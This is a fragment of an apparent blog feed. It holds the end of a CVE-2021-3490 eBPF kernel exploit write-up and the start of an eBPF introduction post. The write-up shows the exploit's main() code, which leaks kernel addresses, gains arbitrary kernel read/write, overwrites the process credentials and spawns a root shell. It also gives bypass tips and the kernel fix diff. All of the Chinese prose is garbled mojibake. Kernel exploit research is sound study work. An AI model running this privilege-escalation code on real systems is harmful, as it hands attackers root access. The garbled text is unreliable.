\033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel_base: \033[0m%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffff000000000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak addr of bpf_map!&quot;</span>);<br>    &#125;<br><br>    map_addr = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0x110</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n&quot;</span>, map_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Search for current task_struct&#x27;s addr...&quot;</span>);<br>    current_task = search_for_current_task(map_fd);<br>    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="hljs-number">0xad8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current cred&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_cred);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Hijacking the bpf_map...&quot;</span>);<br>    make_arbitrary_write_ops(map_fd);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Overwriting the current-&gt;cred...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (arbitrary_write_4_bytes_by_map(map_fd, current_cred+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>*i, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* record the log in to file here */</span><br>    log_fd = open(<span class="hljs-string">&quot;./log.txt&quot;</span>, O_RDWR | O_CREAT);<br>    <span class="hljs-keyword">if</span> (log_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create log file!&quot;</span>);<br>    &#125;<br>    write(log_fd, bpf_log_buf, <span class="hljs-built_in">strlen</span>(bpf_log_buf));<br>    close(log_fd);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2023/06/07/x9RAdDMlZr4wF65.png" alt="image.png"></p><blockquote><p>ç¬¬ä¸€æ¬¡çœŸæ­£ä»å¤´å¼€å§‹åš eBPF ç›¸å…³çš„åˆ©ç”¨ï¼Œè¯´å®è¯è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¸è¿‡è™šæ‹Ÿæœºçš„å„ç§å®ç°ç»†èŠ‚ç¡®å®æ¯”æƒ³è±¡ä¸­è¦åºå¤§å¾—å¤šï¼ˆ<del>é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›å¿†èµ·æœ¬ç§‘é˜¶æ®µåšç”¨æˆ·æ€ vm pwn é€†å‘åŠå¤©é€†åˆ°å¤´å¤§çš„ç—›è‹¦</del>ï¼‰</p></blockquote><h2 id="Extra-New-ALU-Sanitation-bypass"><a href="#Extra-New-ALU-Sanitation-bypass" class="headerlink" title="Extra. New ALU Sanitation bypass"></a>Extra. New ALU Sanitation bypass</h2><p>åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">è¿™ä¸ª commit</a> ä¸­ ALU Sanitation åˆå¾—åˆ°äº†è¿›ä¸€æ­¥çš„åŠ å¼ºï¼š</p><ul><li><code>alu_limit</code> çš„è®¡ç®—æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸æ˜¯ä½¿ç”¨æŒ‡é’ˆå¯„å­˜å™¨çš„å½“å‰ä½ç½®ï¼Œè€Œæ˜¯ä½¿ç”¨ä¸€ä¸ª <code>offset</code> å¯„å­˜å™¨</li><li>è¢«è®¤ä¸ºæ˜¯å¸¸æ•°çš„å¯„å­˜å™¨èµ‹å€¼<strong>ä¼šè¢«ç›´æ¥æ›´æ”¹ä¸ºå¸¸é‡èµ‹å€¼</strong></li></ul><p>è¿™ä¸¤ä¸ªæ–°ç‰¹æ€§çš„å¼•å…¥<strong>ä½¿å¾—æœ¬æ–‡æ‰€ç”¨çš„æ”»å‡»æ–¹æ³•è¿‘ä¹å®Œå…¨å¤±æ•ˆ</strong>ï¼Œä¸è¿‡è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬ä¸èƒ½å®Œæˆåˆ©ç”¨ï¼Œåœ¨ <a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf-v2</a> ä¸­æ¥è‡ª vidar-team çš„ chuj å¸ˆå‚…å±•ç¤ºäº†ä¸€ä¸ªæ–°çš„æŠ€å·§â€”â€”ç”±äº <code>bpf_skb_load_bytes()</code> ä¼šå°†ä¸€ä¸ª <code>sk_buff</code> çš„æ•°æ®è¯»åˆ°æ ˆä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨æ„é€ ä¸€ä¸ªè¾ƒé•¿çš„ <code>len</code> å‚æ•°ï¼Œ<strong>ä»è€Œä½¿å¾—æ•°æ®æ‹·è´æ—¶å‘ç”Ÿæ ˆæº¢å‡º</strong></p><p>æˆ‘ä»¬æˆ–è®¸è¿˜éœ€è¦é¢å¤–çš„åŠæ³•æ³„éœ²å†…æ ¸åœ°å€ï¼Œä¸€ä¸ªå¯è¡Œçš„æ–¹å¼æ˜¯ç›´æ¥é€ æˆ kernel oops åé€šè¿‡ dmesg æ³„éœ²å‡ºå†…æ ¸ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ€å·§å¯¹äºæ€»ä¼šè®¾ç½® <code>oops=panic</code> çš„ CTF é¢˜å¹¶ä¸å¯ç”¨ï¼Œä½†æ˜¯<strong>å¤§éƒ¨åˆ†çš„çœŸå®ä¸–ç•Œç¯å¢ƒå…¶å®éƒ½ä¸ä¼šåœ¨ soft panic å‘ç”Ÿæ—¶ç›´æ¥ panic</strong> ï¼ˆ<code>/proc/sys/kernel/panic_on_oops == 0</code>ï¼‰ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•çš„å¯è¡Œæ€§å…¶å®è¿˜æ˜¯æŒºé«˜çš„</p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">è¿™ä¸ª commit</a> ä¸­å®Œæˆäº†å¯¹æ¼æ´çš„ä¿®è¡¥æ“ä½œ,æ¼æ´çš„ä¿®å¤æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦å°†ç¼ºå¤±çš„è®¾ç½® 32 ä½è¾¹ç•Œçš„æ“ä½œè¡¥å……ä¸Šå°±è¡Œï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="hljs-comment">index 757476c91c984..9352a1b7de2dd 100644</span><br><span class="hljs-comment">--- a/kernel/bpf/verifier.c</span><br><span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span><br><span class="hljs-meta">@@ -7084,11 +7084,10 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umax_val = src_reg-&gt;u32_max_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_and will be called so its safe</span><br><span class="hljs-deletion">- * to skip updating register for known 32-bit case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our minimum from the var_off, since that&#x27;s inherently<br>  * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.<br><span class="hljs-meta">@@ -7108,7 +7107,6 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;<br> dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;<br> &#125;<br><span class="hljs-deletion">-</span><br> &#125;<br> <br> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,<br><span class="hljs-meta">@@ -7155,11 +7153,10 @@</span> static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umin_val = src_reg-&gt;u32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_or will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our maximum from the var_off, and our minimum is the<br>  * maximum of the operands&#x27; minima<br><span class="hljs-meta">@@ -7224,11 +7221,10 @@</span> static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,<br> struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_xor will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get both minimum and maximum from the var32_off. */<br> dst_reg-&gt;u32_min_value = var32_off.value;<br></code></pre></td></tr></table></figure><p>ç¬”è€…è®¤ä¸ºè¿™ä¸ªä¿®è¡¥æ–¹å¼è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p><a href="https://bsauce.github.io/2021/08/31/CVE-2021-3490">ã€kernel exploitã€‘CVE-2021-3490 eBPF 32ä½è¾¹ç•Œè®¡ç®—é”™è¯¯æ¼æ´</a></p><p><a href="https://xz.aliyun.com/t/11165">eBPFæ¼æ´CVE-2021-3490åˆ†æä¸åˆ©ç”¨</a></p><p><a href="https://a1ex.online/2021/08/16/ebpf-pwn-A-Love-Story/">ebpf-pwn-A-Love-Story</a></p><p><a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf,d3bpf-v2-WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›æƒ³èµ·äº†è¢« VM Pwn æ”¯é…çš„ææ€–&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="eBPF" scheme="http://blog.arttnba3.cn/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>ã€EBPF.0x00ã€‘eBPF å…¥é—¨æŒ‡åŒ—ï¼ˆä¸€ï¼‰ï¼šç®€ä»‹</title>
    <link href="http://blog.arttnba3.cn/2023/05/31/EBPF_0X00/"/>
    <id>http://blog.arttnba3.cn/2023/05/31/EBPF_0X00/</id>
    <published>2023-05-30T21:46:24.000Z</published>
    <updated>2023-06-06T21:37:07.030Z</updated>
    
    <content type="html"><![CDATA[<p>BEE BEE Iâ€™M A SHEEP</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºæœ€è¿‘æ¯•è®¾æå¾—æœ‰ç‚¹å¤´å¤§ï¼ˆâ†å› ä¸ºè¿™ä¸ªäººå„ç§æ‘¸é±¼å¯¼è‡´è¿›åº¦å·®çš„å¤ªå¤šç„¶åæœ€åå‡ å¤©ç–¯ç‹‚å„ç§èµ¶å·¥ï¼‰ï¼Œæ‰€ä»¥çœ‹ç‚¹å’Œæ¯•è®¾æ— å…³çš„ä¸œè¥¿ï¼ˆè¿™æ ·æ¯•è®¾ä¸æ˜¯æ›´åŠ åšä¸å®Œäº†å˜›ï¼ˆæ‚²ï¼‰</p></blockquote><p>ç¬”è€…ä¸€ç›´æƒ³ç€æœ‰æœºä¼šæ·±å…¥å­¦ä¹ ä¸€ä¸‹ eBPF ç›¸å…³çš„ä¸œè¥¿ï¼Œå¯æƒœæ€»æ˜¯ä¹ æƒ¯æ€§ä¸€å¤´æ‰è¿›æºç å„ç§ç¹æ‚çš„ç»†èŠ‚å½“ä¸­è¿·å¤±è‡ªå·±ç„¶åæ”¾å¼ƒï¼ˆæ‚²ï¼‰</p><p><del>äºæ˜¯è¶ç°åœ¨æœ‰æ—¶é—´ï¼ˆï¼Ÿï¼‰</del> è™½ç„¶ç°åœ¨æ²¡ä»€ä¹ˆæ—¶é—´ï¼Œç¬”è€…è¿˜æ˜¯æƒ³ç»™è¿™ç©æ„å…ˆå¼€ä¸ªå¤´å†™ç¬¬ä¸€ç¯‡åšå®¢ï¼Œæ¯•ç«Ÿåªè¦å¼€äº†ä¸€ä¸ªå¤´ä¹‹ååé¢çš„äº‹æƒ…ä¹Ÿå°±ä¼šç®€å•å¾—å¤šäº†å§ï¼ˆå¤§å˜˜ï¼‰</p><h2 id="What-is-eBPF"><a href="#What-is-eBPF" class="headerlink" title="What is eBPF?"></a>What is eBPF?</h2><p><strong>ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤å™¨</strong>ï¼ˆBerkeley Packet Filterï¼‰æ˜¯ä¸€ä¸ª Linux kernel ä¸­ç”¨ä»¥å¯¹æ¥è‡ªäºé“¾è·¯å±‚çš„æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤çš„æ¶æ„ï¼Œå…¶ä½äºå†…æ ¸ä¸­çš„æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/Cpf7VY9z5lsG2u3.png" alt="image.png"></p><p>ç›¸æ¯”èµ·ä¼ ç»Ÿçš„æ•°æ®åŒ…è¿‡æ»¤å™¨è€Œè¨€ï¼ŒBPF <strong>åœ¨å†…æ ¸ä¸­</strong>å®ç°äº†ä¸€ä¸ªæ–°çš„<strong>è™šæ‹Ÿæœº</strong>è®¾è®¡ï¼Œé€šè¿‡<strong>å³æ—¶ç¼–è¯‘</strong>ï¼ˆJust-In-Time compilationï¼‰æŠ€æœ¯å°† BPF æŒ‡ä»¤ç¿»è¯‘ä¸º BPF è™šæ‹Ÿæœºçš„å­—èŠ‚ç ï¼Œå¯ä»¥é«˜æ•ˆåœ°å·¥ä½œåœ¨åŸºäºå¯„å­˜å™¨ç»“æ„çš„ CPU ä¸Š</p><p>Linux kernel è‡ª 3.18 ç‰ˆæœ¬èµ·æä¾›äº†<strong>æ‰©å±•ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤å™¨</strong>ï¼ˆ<strong>e</strong>xtended <strong>BPF</strong>ï¼Œå³ <code>eBPF</code>ï¼‰ï¼Œå…¶åº”ç”¨èŒƒå›´æ›´å¹¿ï¼Œèƒ½å¤Ÿè¢«åº”ç”¨äºæ›´å¤šçš„åœºæ™¯ï¼ŒåŸæ¥çš„ BPF è¢«ç§°ä¸º <strong>c</strong>lassic <strong>BPF</strong>ï¼ˆcBPFï¼‰ï¼Œä¸”ç›®å‰åŸºæœ¬ä¸Šå·²ç»è¢«åºŸå¼ƒï¼ŒLinux ä¼šå°† cBPF å­—èŠ‚ç è½¬åŒ–ä¸º eBPF å­—èŠ‚ç å†æ‰§è¡Œ</p><p>ä½œä¸ºä¸€ä¸ª<strong>ä½äºå†…æ ¸å±‚é¢çš„è™šæ‹Ÿæœº</strong>ï¼ŒeBPF æ— ç–‘ä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªç›¸å½“å¤§çš„æ–°æ”»å‡»é¢ï¼Œå› æ­¤ä¹Ÿæˆä¸ºè¿‘å‡ å¹´å†…æ ¸åˆ©ç”¨ä¸­çš„â€œå¤§çƒ­é—¨â€ï¼Œæœ¬ç¯‡åšå®¢ä¸­ç¬”è€…å°†ç®€è¿° eBPF çš„åŸºæœ¬åŸç†</p><blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸­æ¶‰åŠåˆ°çš„ Linux kernel æºç æ¥è‡ªç‰ˆæœ¬ 6.3.2</p></blockquote><h1 id="0x01-eBPF-çš„åŸºæœ¬æ¶æ„"><a href="#0x01-eBPF-çš„åŸºæœ¬æ¶æ„" class="headerlink" title="0x01.eBPF çš„åŸºæœ¬æ¶æ„"></a>0x01.eBPF çš„åŸºæœ¬æ¶æ„</h1><h2 id="ä¸€ã€eBPF-çš„è¿è¡Œè¿‡ç¨‹"><a href="#ä¸€ã€eBPF-çš„è¿è¡Œè¿‡ç¨‹" class="headerlink" title="ä¸€ã€eBPF çš„è¿è¡Œè¿‡ç¨‹"></a>ä¸€ã€eBPF çš„è¿è¡Œè¿‡ç¨‹</h2><p>Linux ä¸‹ eBPF çš„æ•´ä½“æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/20/HfExF3JwKX9nOvi.png" alt="image.png"></p><ul><li>ç”¨æˆ·è¿›ç¨‹é¦–å…ˆåœ¨ç”¨æˆ·ç©ºé—´ç¼–å†™ç›¸åº”çš„ BPF å­—èŠ‚ç ç¨‹åºï¼Œä¼ å…¥å†…æ ¸</li><li>å†…æ ¸é€šè¿‡ <code>verifier</code> å¯¹å­—èŠ‚ç ç¨‹åºè¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ï¼Œé€šè¿‡æ£€æŸ¥åä¾¿é€šè¿‡ JIT ç¼–è¯‘è¿è¡Œï¼ŒeBPF ç¨‹åºä¸»è¦åˆ†ä¸ºå¦‚ä¸‹ç±»å‹ï¼š<ul><li><code>kprobes</code> ï¼šå†…æ ¸ä¸­çš„åŠ¨æ€è·Ÿè¸ªï¼Œå¯ä»¥è·Ÿè¸ªè‡³å†…æ ¸ä¸­çš„å‡½æ•°å…¥å£æˆ–è¿”å›ç‚¹</li><li><code>uprobes</code> ï¼šç”¨æˆ·ç©ºé—´ä¸­çš„åŠ¨æ€è·Ÿè¸ªï¼Œä¸ kprobes ä¸åŒçš„æ˜¯è·Ÿè¸ªçš„å‡½æ•°ä½äºç”¨æˆ·ç¨‹åºä¸­</li><li><code>tracepoints</code> ï¼šå†…æ ¸ä¸­çš„é™æ€è·Ÿè¸ª</li><li><code>perf_events</code> ï¼šå®šæ—¶é‡‡æ ·ä¸ PMC</li></ul></li><li>æ˜ å°„ï¼ˆmapï¼‰ä½œä¸ºç”¨ä»¥ä¿å­˜æ•°æ®çš„é€šç”¨ç»“æ„ï¼Œå¯ä»¥åœ¨ä¸åŒçš„ eBPF ç¨‹åºä¹‹é—´æˆ–æ˜¯ç”¨æˆ·è¿›ç¨‹ä¸å†…æ ¸é—´å…±äº«æ•°æ®</li></ul><blockquote><p>ä¸åŒç‰ˆæœ¬çš„ eBPF æ‰€æ”¯æŒçš„åŠŸèƒ½æ˜¯ä¸åŒçš„ï¼Œå‚è§<a href="https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md">è¿™â†‘é‡Œâ†“</a></p><table><thead><tr><th>version</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>4.1</td><td>kprobe support</td></tr><tr><td>4.4</td><td>Perf events</td></tr><tr><td>4.7</td><td>Tracepoints support</td></tr><tr><td>4.8</td><td>XDP core</td></tr><tr><td>4.10</td><td>cgroups support</td></tr></tbody></table></blockquote><p>ä¸€ä¸ª eBPF ç¨‹åºå¯ä»¥è¢«æŒ‚è½½åˆ°å¤šä¸ªäº‹ä»¶ä¸Šï¼Œä¸åŒçš„ eBPF ç¨‹åºä¹‹é—´å¯ä»¥å…±äº«åŒä¸€ä¸ªæ˜ å°„</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tracing     tracing    tracing    packet      packet     packet<br>event A     event B    event C    on eth0     on eth1    on eth2<br> |<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           </span>|<span class="hljs-string">          ^</span><br><span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           v          </span>|<br> --&gt; tracing <span class="hljs-variable">&lt;--     tracing      socket    tc ingress   tc egress</span><br><span class="hljs-variable">      prog_1          prog_2      prog_3    classifier    action</span><br><span class="hljs-variable">      |  |              |           |         prog_4      prog_5</span><br><span class="hljs-variable">   |---  -----|  |------|          map_3        |           |</span><br><span class="hljs-variable"> map_1       map_2                              --| map_4 |--</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€eBPF-verifier"><a href="#äºŒã€eBPF-verifier" class="headerlink" title="äºŒã€eBPF verifier"></a>äºŒã€eBPF verifier</h2><p>åœ¨ eBPF å­—èŠ‚ç è¢«ä¼ å…¥åˆ°å†…æ ¸ç©ºé—´åï¼Œå…¶é¦–å…ˆéœ€è¦ç»è¿‡ <code>verifier</code> çš„å®‰å…¨æ£€æŸ¥ï¼Œä¹‹åæ‰èƒ½è¿›è¡Œ JIT ç¼–è¯‘ï¼Œverifier ä¸»è¦æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>æ²¡æœ‰å›å‘è¾¹ï¼ˆback edgeï¼‰ã€ç¯è·¯ï¼ˆloopï¼‰ã€ä¸å¯è¾¾ï¼ˆunreachableï¼‰æŒ‡ä»¤</li><li>ä¸èƒ½åœ¨æŒ‡é’ˆä¹‹é—´è¿›è¡Œæ¯”è¾ƒï¼ŒæŒ‡é’ˆåªèƒ½ä¸æ ‡é‡è¿›è¡ŒåŠ å‡ï¼ˆeBPF ä¸­çš„æ ‡é‡å€¼ä¸ºä¸ä»æŒ‡é’ˆæ´¾ç”Ÿçš„å€¼ï¼‰ï¼Œverifier ä¼šè¿½è¸ªå“ªäº›å¯„å­˜å™¨åŒ…å«æŒ‡é’ˆã€å“ªäº›å¯„å­˜å™¨åŒ…å«æ ‡é‡å€¼</li><li>æŒ‡é’ˆè¿ç®—ä¸èƒ½ç¦»å¼€ä¸€ä¸ª map çš„â€œå®‰å…¨â€è¾¹ç•Œï¼Œè¿™æ„å‘³ç€ç¨‹åºä¸èƒ½è®¿é—®é¢„å®šä¹‰çš„ map å¤–çš„å†…å­˜ï¼Œverifier é€šè¿‡è¿½è¸ªæ¯ä¸ªå¯„å­˜å™¨å€¼çš„ä¸Šç•Œä¸ä¸‹ç•Œ</li><li>ä¸èƒ½å°†æŒ‡é’ˆå­˜å‚¨åœ¨ map ä¸­æˆ–ä½œä¸ºè¿”å›å€¼ï¼Œä»¥é¿å…å°†å†…æ ¸åœ°å€æ³„éœ²åˆ°ç”¨æˆ·ç©ºé—´</li></ul><p>åœ¨ <code>kernel/bpf/verifier.c</code>  å¼€å¤´æ³¨é‡Šé˜è¿°å¦‚ä¸‹ï¼š</p><blockquote><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæœ‰çš„ä¿ç•™åŸæ–‡æ²¡æœ‰ç¿»è¯‘</p><blockquote><p>æ¯”å¦‚è¯´ç›´æ¥è¯´ <code>map element key</code> ä½ è‚¯å®šçŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘è¦æ˜¯è¯´ <code>æ˜ å°„å…ƒç´ é”®</code> é‚£ä½ è‚¯å®šå¾—æ¥ä¸€ä¼šâ€¦.</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 